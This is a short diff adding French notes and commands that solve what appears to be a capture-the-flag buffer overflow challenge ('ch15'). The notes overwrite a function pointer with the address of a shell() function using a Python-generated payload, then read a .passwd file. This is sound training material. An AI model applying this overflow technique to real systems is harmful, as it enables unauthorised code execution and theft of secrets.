@@ -1,0 +1,11 @@
+#on a un buffer de 128 octects, on en lit 133
+#l'overflow se fait sur le pointeur sur fonction
+#on choppe l'addresse de la fonction shell() (nm ./ch15)
+#on fait l'overflow a cette adresse et on met un cat pour bloquer le shell
+
+nm ./ch15
+08048464 T shell
+python -c 'print "A" * 128 + "\x64\x84\x04\x08"' > /tmp/boo
+(cat /tmp/boo; cat) | ./ch15
+cat .passwd
+
